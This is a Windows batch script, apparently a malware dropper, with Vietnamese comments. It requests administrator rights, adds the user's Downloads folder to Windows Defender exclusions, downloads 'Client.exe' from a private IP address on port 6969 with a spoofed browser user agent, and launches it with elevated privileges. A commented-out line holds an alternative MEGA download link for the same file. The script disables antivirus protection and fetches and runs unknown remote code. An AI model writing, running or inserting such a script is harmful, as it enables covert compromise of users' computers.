@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting admin privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

:: URL và đường dẫn file đầu ra (batch syntax)
set "url=http://10.161.61.227:6969/Client.exe"
set "outPath=%~dp0Client.exe"

timeout /t 1 >nul

echo Adding Downloads folder to Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"

echo Downloading file to "%outPath%"...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outPath%' -MaximumRedirection 10 -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }"

if exist "%outPath%" (
    echo Running the downloaded file...
    powershell -Command "Start-Process -FilePath '%outPath%' -Verb runAs"
) else (
    echo Download failed.
    pause
)

@REM $url="https://gfs204n191.userstorage.mega.co.nz/dl/NnbUOyf8NG9SWAesLEz2-T0iNTSnH1kT8992mb9N_ZuEs9LIg_0zJOjq4Txz34CPXpURR9ZYB1QALA5ubWvLkPCgk2EsmJHrEQ6IiOMySz77hVzLEcgE781ix_yLmPeW51plsu0KbJ6xugDX7QALVr2bQWoIcQ/Client.exe"